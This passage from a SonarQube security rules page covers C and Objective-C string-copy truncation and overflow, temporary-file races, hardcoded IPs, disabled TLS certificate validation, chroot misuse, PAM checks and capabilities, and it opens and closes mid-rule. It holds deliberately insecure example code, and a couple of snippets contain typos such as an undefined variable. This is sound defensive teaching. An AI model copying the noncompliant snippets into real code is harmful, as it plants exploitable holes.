<p>The function <code>char *strncpy(char * restrict dest, const char * restrict src, size_t count);</code> copies the first <code>count</code>
characters from <code>src</code> to <code>dest</code>, stopping at the first <code>null</code> character, and filling extra space with 0. The
<code>wcsncpy</code> does the same for wide characters and should be used with the same guidelines.</p>
<p>Both of those functions are designed to work with fixed-length strings and might result in a non-<code>null</code>-terminated string.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> There is a possibility that either the <code>source</code> or the <code>destination</code> pointer is <code>null</code> </li>
  <li> The security of your system can be compromised if the <code>destination</code> is a truncated version of the <code>source</code> </li>
  <li> The <code>source</code> buffer can be both non-<code>null</code>-terminated and smaller than the <code>count</code> </li>
  <li> The <code>destination</code> buffer can be smaller than the <code>count</code> </li>
  <li> You expect <code>dest</code> to be a <code>null</code>-terminated string </li>
  <li> There is an overlap between the <code>source</code> and the <code>destination</code> </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> C11 provides, in its annex K, the <code>strncpy_s</code> and the <code>wcsncpy_s</code> that were designed as safer alternatives to
  <code>strcpy</code> and <code>wcscpy</code>. It’s not recommended to use them in all circumstances, because they introduce a runtime overhead and
  require to write more code for error handling, but they perform checks that will limit the consequences of calling the function with bad arguments.
  </li>
  <li> Even if your compiler does not exactly support annex K, you probably have access to similar functions </li>
  <li> If you are using <code>strncpy</code> and <code>wsncpy</code> as a safer version of <code>strcpy</code> and <code>wcscpy</code>, you should
  instead consider <code>strcpy_s</code> and <code>wcscpy_s</code>, because these functions have several shortcomings:
    <ul>
      <li> It’s not easy to detect truncation </li>
      <li> Too much work is done to fill the buffer with 0, leading to suboptimal performance </li>
      <li> Unless manually corrected, the <code>dest</code> string might not be <code>null</code>-terminated </li>
    </ul>  </li>
  <li> If you want to use <code>strcpy</code> and <code>wcscpy</code> functions and detect if the string was truncated, the pattern is the following:
    <ul>
      <li> Set the last character of the buffer to <code>null</code> </li>
      <li> Call the function </li>
      <li> Check if the last character of the buffer is still <code>null</code> </li>
    </ul>  </li>
  <li> If you are writing C++ code, using <code>std::string</code> to manipulate strings is much simpler and less error-prone </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
int f(char *src) {
  char dest[256];
  strncpy(dest, src, sizeof(dest)); // Sensitive: might silently truncate
  return doSomethingWith(dest);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int f(char *src) {
  char dest[256];
  dest[sizeof dest - 1] = 0;
  strncpy(dest, src, sizeof(dest)); // Compliant
  if (dest[sizeof dest - 1] != 0) {
    // Handle error
  }
  return doSomethingWith(dest);
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/">Top 10 2021 Category A6 - Vulnerable and Outdated
  Components</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">Top 10 2017 Category A9 -
  Using Components with Known Vulnerabilities</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/120">CWE-120 - Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')</a>
  </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/HdcxBQ">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S5815">
              objc:S5815
            </a>
          </td>
          <td>
            <details>
              <p>In C, a string is just a buffer of characters, normally using the <code>null</code> character as a sentinel for the end of the string. This means
that the developer has to be aware of low-level details such as buffer sizes or having an extra character to store the final <code>null</code>
character. Doing that correctly and consistently is notoriously difficult and any error can lead to a security vulnerability, for instance, giving
access to sensitive data or allowing arbitrary code execution.</p>
<p>The function <code>char *strncat( char *restrict dest, const char *restrict src, size_t count );</code> appends the characters of string
<code>src</code> at the end of <code>dest</code>, but only add <code>count</code> characters max. <code>dest</code> will always be
<code>null</code>-terminated. The <code>wcsncat</code> does the same for wide characters, and should be used with the same guidelines.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> There is a possibility that either the <code>src</code> or the <code>dest</code> pointer is <code>null</code> </li>
  <li> The current string length of <code>dest</code> plus the current string length of <code>src</code> plus 1 (for the final <code>null</code>
  character) is larger than the size of the buffer pointer-to by <code>src</code> </li>
  <li> There is a possibility that either string is not correctly <code>null</code>-terminated </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> C11 provides, in its annex K, the <code>strncat_s</code> and the <code>wcsncat_s</code> that were designed as safer alternatives to
  <code>strncat</code> and <code>wcsncat</code>. It’s not recommended to use them in all circumstances because they introduce a runtime overhead and
  require to write more code for error handling, but they perform checks that will limit the consequences of calling the function with bad arguments.
  </li>
  <li> Even if your compiler does not exactly support annex K, you probably have access to similar functions </li>
  <li> If you are using <code>strncat</code> and <code>wsncat</code> as a safer version of <code>strcat</code> and <code>wcscat</code>, you should
  instead consider <code>strcat_s</code> and <code>wcscat_s</code> because these functions have several shortcomings:
    <ul>
      <li> It’s not easy to detect truncation </li>
      <li> The <code>count</code> parameter is error-prone </li>
      <li> Computing the <code>count</code> parameter typically requires computing the string length of <code>dest</code>, at which point other
      simpler alternatives exist </li>
    </ul>  </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
int f(char *src) {
  char dest[256];
  strcpy(dest, "Result: ");
  strncat(dest, src, sizeof dest); // Sensitive: passing the buffer size instead of the remaining size
  return doSomethingWith(dest);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int f(char *src) {
  char result[] = "Result: ";
  char dest[256];
  strcpy(dest, result);
  strncat(dest, src, sizeof dest - sizeof result); // Compliant but may silently truncate
  return doSomethingWith(dest);
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/">Top 10 2021 Category A6 - Vulnerable and Outdated
  Components</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">Top 10 2017 Category A9 -
  Using Components with Known Vulnerabilities</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/120">CWE-120 - Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')</a>
  </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/HdcxBQ">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S5824">
              objc:S5824
            </a>
          </td>
          <td>
            <details>
              <p>The functions "tmpnam", "tmpnam_s" and "tmpnam_r" are all used to return a file name that does not match an existing file, in order for the
application to create a temporary file. However, even if the file did not exist at the time those functions were called, it might exist by the time
the application tries to use the file name to create the files. This has been used by hackers to gain access to files that the application believed
were trustworthy.</p>
<p>There are alternative functions that, in addition to creating a suitable file name, create and open the file and return the file handler. Such
functions are protected from this attack vector and should be preferred. About the only reason to use these functions would be to create a temporary
folder, not a temporary file.</p>
<p>Additionally, these functions might not be thread-safe, and if you don’t provide them buffers of sufficient size, you will have a buffer
overflow.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> There is a possibility that several threads call any of these functions simultaneously </li>
  <li> There is a possibility that the resulting file is opened without forcing its creation, meaning that it might have unexpected access rights
  </li>
  <li> The buffers passed to these functions are respectively smaller than
    <ul>
      <li> <code>L_tmpnam</code> for <code>tmpnam</code> </li>
      <li> <code>L_tmpnam_s</code> for <code>tmpnam_s</code> </li>
      <li> <code>L_tmpnam</code> for <code>tmpnam_r</code> </li>
    </ul>  </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use a function that directly opens the temporary file, such a <code>tmpfile</code>, <code>tmpfile_s</code>, <code>mkstemp</code> or
  <code>mkstemps</code> (the last two allow more accurate control of the file name). </li>
  <li> If you can’t get rid of these functions, when using the generated name to open the file, use a function that forces the creation of the file
  and fails if the file already exists. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
int f(char *tempData) {
  char *path = tmpnam(NULL); // Sensitive
  FILE* f = fopen(tmpnam, "w");
  fputs(tempData, f);
  fclose(f);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int f(char *tempData) {
  // The file will be opened in "wb+" mode, and will be automatically removed on normal program exit
  FILE* f = tmpfile(); // Compliant
  fputs(tempData, f);
  fclose(f);
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/">Top 10 2021 Category A6 - Vulnerable and Outdated
  Components</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">Top 10 2017 Category A9 -
  Using Components with Known Vulnerabilities</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/377">CWE-377 - Insecure Temporary File</a> </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/display/c/CON33-C.+Avoid+race+conditions+when+using+library+functions">CERT, CON33-C.</a> - Avoid
  race conditions when using library functions </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/display/c/FIO21-C.+Do+not+create+temporary+files+in+shared+directories">CERT, FIO21-C.</a> - Do
  not create temporary files in shared directories </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S1313">
              objc:S1313
            </a>
          </td>
          <td>
            <details>
              <p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901">CVE-2006-5901</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725">CVE-2005-3725</a> </li>
</ul>
<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery, and deployment:</p>
<ul>
  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>
  <li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li>
</ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to
bypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which
will increase an attack’s impact.</p>
<h2>Ask Yourself Whether</h2>
<p>The disclosed IP address is sensitive, e.g.:</p>
<ul>
  <li> Can give information to an attacker about the network topology. </li>
  <li> It’s a personal (assigned to an identifiable person) IP address. </li>
</ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar
approach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having
to rebuild the software.</p>
<h2>Sensitive Code Example</h2>
<pre>
dbi_conn conn = dbi_conn_new("mysql");
string host = "10.10.0.1"; // Sensitive
dbi_conn_set_option(conn, "host", host.c_str());
dbi_conn_set_option(conn, "host", "10.10.0.1"); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
dbi_conn conn = dbi_conn_new("mysql");
string host = getDatabaseHost(); // Compliant
dbi_conn_set_option(conn, "host", host.c_str()); // Compliant
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul>
  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>
  <li> Broadcast address 255.255.255.255 </li>
  <li> Non-routable address 0.0.0.0 </li>
  <li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href="http://www.oid-info.com/introduction.htm">often match
  Object Identifiers</a> (OID) </li>
  <li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a
  href="https://datatracker.ietf.org/doc/html/rfc5737">RFC 5737</a> </li>
  <li> Addresses in the range 2001:db8::/32, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc3849">RFC
  3849</a> </li>
</ul>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S4830">
              objc:S4830
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that an encrypted communication is intercepted.</p>
<h2>Why is this an issue?</h2>
<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them.
Certificate validation adds an extra layer of trust and security to this process to ensure that a system is indeed the one it claims to be.</p>
<p>When certificate validation is disabled, the client skips a critical security check. This creates an opportunity for attackers to pose as a trusted
entity and intercept, manipulate, or steal the data being transmitted.</p>
<h3>What is the potential impact?</h3>
<p>Establishing trust in a secure way is a non-trivial task. When you disable certificate validation, you are removing a key mechanism designed to
build this trust in internet communication, opening your system up to a number of potential threats.</p>
<h4>Identity spoofing</h4>
<p>If a system does not validate certificates, it cannot confirm the identity of the other party involved in the communication. An attacker can
exploit this by creating a fake server and masquerading as a legitimate one. For example, they might set up a server that looks like your bank’s
server, tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect
any data your system sends to them, potentially leading to significant data breaches.</p>
<h4>Loss of data integrity</h4>
<p>When TLS certificate validation is disabled, the integrity of the data you send and receive cannot be guaranteed. An attacker could modify the data
in transit, and you would have no way of knowing. This could range from subtle manipulations of the data you receive to the injection of malicious
code or malware into your system. The consequences of such breaches of data integrity can be severe, depending on the nature of the data and the
system.</p>
<h2>How to fix it in Botan</h2>
<h3>Code examples</h3>
<p>The following code contains examples of disabled certificate validation.</p>
<p>The certificate validation gets disabled by overriding <code>tls_verify_cert_chain</code> with an empty implementation. It is highly recommended to
use the original implementation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
#include &lt;botan/tls_client.h&gt;
#include &lt;botan/tls_callbacks.h&gt;
#include &lt;botan/tls_session_manager.h&gt;
#include &lt;botan/tls_policy.h&gt;
#include &lt;botan/auto_rng.h&gt;
#include &lt;botan/certstor.h&gt;
#include &lt;botan/certstor_system.h&gt;

class Callbacks : public Botan::TLS::Callbacks
{
    virtual void tls_verify_cert_chain(
              const std::vector&lt;Botan::X509_Certificate&gt; &amp;cert_chain,
              const std::vector&lt;std::shared_ptr&lt;const Botan::OCSP::Response&gt;&gt; &amp;ocsp_responses,
              const std::vector&lt;Botan::Certificate_Store *&gt; &amp;trusted_roots,
              Botan::Usage_Type usage,
              const std::string &amp;hostname,
              const Botan::TLS::Policy &amp;policy)
    override  { }
};

class Client_Credentials : public Botan::Credentials_Manager { };

void connect() {
    Callbacks callbacks;
    Botan::AutoSeeded_RNG rng;
    Botan::TLS::Session_Manager_In_Memory session_mgr(rng);
    Client_Credentials creds;
    Botan::TLS::Strict_Policy policy;

    Botan::TLS::Client client(callbacks, session_mgr, creds, policy, rng,
                              Botan::TLS::Server_Information("example.com", 443),
                              Botan::TLS::Protocol_Version::TLS_V12); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
#include &lt;botan/tls_client.h&gt;
#include &lt;botan/tls_callbacks.h&gt;
#include &lt;botan/tls_session_manager.h&gt;
#include &lt;botan/tls_policy.h&gt;
#include &lt;botan/auto_rng.h&gt;
#include &lt;botan/certstor.h&gt;
#include &lt;botan/certstor_system.h&gt;

class Callbacks : public Botan::TLS::Callbacks { };

class Client_Credentials : public Botan::Credentials_Manager { };

void connect() {
    Callbacks callbacks;
    Botan::AutoSeeded_RNG rng;
    Botan::TLS::Session_Manager_In_Memory session_mgr(rng);
    Client_Credentials creds;
    Botan::TLS::Strict_Policy policy;

    Botan::TLS::Client client(callbacks, session_mgr, creds, policy, rng,
                              Botan::TLS::Server_Information("example.com", 443),
                              Botan::TLS::Protocol_Version::TLS_V12);
}
</pre>
<h3>How does this work?</h3>
<p>Addressing the vulnerability of disabled TLS certificate validation primarily involves re-enabling the default validation.</p>
<p>To avoid running into problems with invalid certificates, consider the following sections.</p>
<h4>Using trusted certificates</h4>
<p>If possible, always use a certificate issued by a well-known, trusted CA for your server. Most programming environments come with a predefined list
of trusted root CAs, and certificates issued by these authorities are validated automatically. This is the best practice, and it requires no
additional code or configuration.</p>
<h4>Working with self-signed certificates or non-standard CAs</h4>
<p>In some cases, you might need to work with a server using a self-signed certificate, or a certificate issued by a CA not included in your trusted
roots. Rather than disabling certificate validation in your code, you can add the necessary certificates to your trust store.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://botan.randombit.net/handbook/">Botan</a> - Handbook </li>
  <li> <a href="https://www.feistyduck.com/books/openssl-cookbook/">OpenSSL</a> - Cookbook </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication">Mobile Top 10 2016 Category M3 - Insecure
  Communication</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements">Mobile AppSec
  Verification Standard - Network Communication Requirements</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/295">CWE-295 - Improper Certificate Validation</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S5801">
              objc:S5801
            </a>
          </td>
          <td>
            <details>
              <p>In C, a string is just a buffer of characters, normally using the <code>null</code> character as a sentinel for the end of the string. This means
that the developer has to be aware of low-level details such as buffer sizes or having an extra character to store the final <code>null</code>
character. Doing that correctly and consistently is notoriously difficult and any error can lead to a security vulnerability, for instance, giving
access to sensitive data or allowing arbitrary code execution.</p>
<p>The function <code>char *strcpy(char * restrict dest, const char * restrict src);</code> copies characters from <code>src</code> to
<code>dest</code>. The <code>wcscpy</code> does the same for wide characters and should be used with the same guidelines.</p>
<p>Note: the functions <code>strncpy</code> and <code>wcsncpy</code> might look like attractive safe replacements for <code>strcpy</code> and
<code>wcscpy</code>, but they have their own set of issues (see <a href='/organizations/sopra-steria/rules?open=objc%3AS5816&rule_key=objc%3AS5816'>S5816</a>), and you should probably prefer another more adapted
alternative.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> There is a possibility that either the source or the destination pointer is <code>null</code> </li>
  <li> There is a possibility that the source string is not correctly <code>null</code>-terminated, or that its length (including the final
  <code>null</code> character) can be larger than the size of the destination buffer. </li>
  <li> There is an overlap between source and destination </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> C11 provides, in its annex K, the <code>strcpy_s</code> and the <code>wcscpy_s</code> that were designed as safer alternatives to
  <code>strcpy</code> and <code>wcscpy</code>. It’s not recommended to use them in all circumstances, because they introduce a runtime overhead and
  require to write more code for error handling, but they perform checks that will limit the consequences of calling the function with bad arguments.
  </li>
  <li> Even if your compiler does not exactly support annex K, you probably have access to similar functions, for example, <code>strlcpy</code> in
  FreeBSD </li>
  <li> If you are writing C++ code, using <code>std::string</code> to manipulate strings is much simpler and less error-prone </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
int f(char *src) {
  char dest[256];
  strcpy(dest, src); // Sensitive: might overflow
  return doSomethingWith(dest);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int f(char *src) {
  char *dest = malloc(strlen(src) + 1); // For the final 0
  strcpy(dest, src); // Compliant: we made sure the buffer is large enough
  int r= doSomethingWith(dest);
  free(dest);
  return r;
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/">Top 10 2021 Category A6 - Vulnerable and Outdated
  Components</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">Top 10 2017 Category A9 -
  Using Components with Known Vulnerabilities</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/120">CWE-120 - Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')</a>
  </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/HdcxBQ">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S5802">
              objc:S5802
            </a>
          </td>
          <td>
            <details>
              <p>The purpose of creating a jail, the "virtual root directory" created with chroot-type functions, is to limit access to the file system by isolating
the process inside this jail. However, many chroot function implementations don’t modify the current working directory, thus the process has still
access to unauthorized resources outside of the "jail".</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The application changes the working directory before or after running chroot. </li>
  <li> The application uses a path inside the jail directory as working directory. </li>
</ul>
<p>There is a risk if you answered no to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Change the current working directory to the root directory after switching to a jail directory.</p>
<h2>Sensitive Code Example</h2>
<p>The current directory is not changed with the <code>chdir</code> function before or after the creation of a jail with the <code>chroot</code>
function:</p>
<pre>
const char* root_dir = "/jail/";
chroot(root_dir); // Sensitive: no chdir before or after chroot, and missing check of return value
</pre>
<p>The <code>chroot</code> or <code>chdir</code> operations could fail and the process still have access to unauthorized resources. The return code
should be checked:</p>
<pre>
const char* root_dir = "/jail/";
chroot(root_dir); // Sensitive: missing check of the return value
const char* any_dir = "/any/";
chdir(any_dir); // Sensitive: missing check of the return value
</pre>
<h2>Compliant Solution</h2>
<p>To correctly isolate the application into a jail, change the current directory with <code>chdir</code> before the <code>chroot</code> and check the
return code of both functions:</p>
<pre>
const char* root_dir = "/jail/";

if (chdir(root_dir) == -1) {
  exit(-1);
}

if (chroot(root_dir) == -1) {  // compliant: the current dir is changed to the jail and the results of both functions are checked
  exit(-1);
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/243">CWE-243 - Creation of chroot Jail Without Changing Working Directory</a> </li>
  <li> <a href="https://man7.org/linux/man-pages/man2/chdir.2.html">man7.org</a> - chdir </li>
  <li> <a href="https://man7.org/linux/man-pages/man2/chroot.2.html">man7.org</a> - chroot </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S5982">
              c:S5982
            </a>
          </td>
          <td>
            <details>
              <p>The purpose of changing the current working directory is to modify the base path when the process performs relative path resolutions. When the
working directory cannot be changed, the process keeps the directory previously defined as the active working directory. Thus, verifying the success
of chdir() type of functions is important to prevent unintended relative paths and unauthorized access.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The success of changing the working directory is relevant for the application. </li>
  <li> Changing the working directory is required by chroot to make the new root effective. </li>
  <li> Subsequent disk operations are using relative paths. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>After changing the current working directory verify the success of the operation and handle errors.</p>
<h2>Sensitive Code Example</h2>
<p>The <code>chdir</code> operation could fail and the process still has access to unauthorized resources. The return code should be verified:</p>
<pre>
const char* any_dir = "/any/";
chdir(any_dir); // Sensitive: missing check of the return value

int fd = open(any_dir, O_RDONLY | O_DIRECTORY);
fchdir(fd); // Sensitive: missing check of the return value
</pre>
<h2>Compliant Solution</h2>
<p>Verify the return code of <code>chdir</code> and handle errors:</p>
<pre>
const char* root_dir = "/jail/";
if (chdir(root_dir) == -1) {
  exit(-1);
} // Compliant

int fd = open(any_dir, O_RDONLY | O_DIRECTORY);
if(fchdir(fd) == -1) {
  exit(-1);
} // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/252">CWE-252 - Unchecked Return Value</a> </li>
  <li> <a href="https://man7.org/linux/man-pages/man2/chdir.2.html">man7.org</a> - chdir </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S5832">
              c:S5832
            </a>
          </td>
          <td>
            <details>
              <p>Pluggable authentication module (PAM) is a mechanism used on many UNIX variants to provide a unified way to authenticate users, independently of
the underlying authentication scheme.</p>
<h2>Why is this an issue?</h2>
<p>When authenticating users, if the validity of the account is not checked (not locked, not expired …​), it may lead to unauthorized access to
resources.</p>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
int valid(pam_handle_t *pamh) {
    if (pam_authenticate(pamh, PAM_DISALLOW_NULL_AUTHTOK) != PAM_SUCCESS) { // Noncompliant
        return -1;
    }

    return 0;
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
int valid(pam_handle_t *pamh) {
    if (pam_authenticate(pamh, PAM_DISALLOW_NULL_AUTHTOK) != PAM_SUCCESS) {
        return -1;
    }
    if (pam_acct_mgmt(pamh, 0) != PAM_SUCCESS) {
        return -1;
    }

    return 0;
}
</pre>
<h3>How does this work?</h3>
<p>The account validity is checked with <code>pam_acct_mgmt</code> when authenticating a user with <code>pam_authenticate</code>.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> The Open Group - <a href="https://pubs.opengroup.org/onlinepubs/8329799/pam_acct_mgmt.htm"><code>pam_acct_mgmt</code></a> </li>
</ul>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> Packt hub - <a href="https://hub.packtpub.com/development-pluggable-authentication-modules-pam/">Development with Pluggable Authentication
  Modules (PAM)</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/304">CWE-304 - Missing Critical Step in Authentication</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S5849">
              c:S5849
            </a>
          </td>
          <td>
            <details>
              <p>Setting capabilities can lead to privilege escalation.</p>
<p>Linux capabilities allow you to assign narrow slices of <code>root</code>'s permissions to files or processes. A thread with capabilities bypasses
the normal kernel security checks to execute high-privilege actions such as mounting a device to a directory, without requiring (additional) root
privileges.</p>
<h2>Ask Yourself Whether</h2>
<p>Capabilities are granted:</p>
<ul>
  <li> To a process that does not require all capabilities to do its job. </li>
  <li> To a not trusted process. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Capabilities are high privileges, traditionally associated with superuser (root), thus make sure that the most restrictive and necessary
capabilities are assigned to files and processes.</p>
<h2>Sensitive Code Example</h2>
<p>When setting capabilities:</p>
<pre>
cap_t caps = cap_init();
cap_value_t cap_list[2];
cap_list[0] = CAP_FOWNER;
cap_list[1] = CAP_CHOWN;
cap_set_flag(caps, CAP_PERMITTED, 2, cap_list, CAP_SET);

cap_set_file("file", caps); // Sensitive
cap_set_fd(fd, caps); // Sensitive
cap_set_proc(caps); // Sensitive
capsetp(pid, caps); // Sensitive
capset(hdrp, datap); // Sensitive: is discouraged to be used because it is a system call
</pre>
<p>When setting SUID/SGID attributes:</p>
<pre>
chmod("file", S_ISUID|S_ISGID); // Sensitive
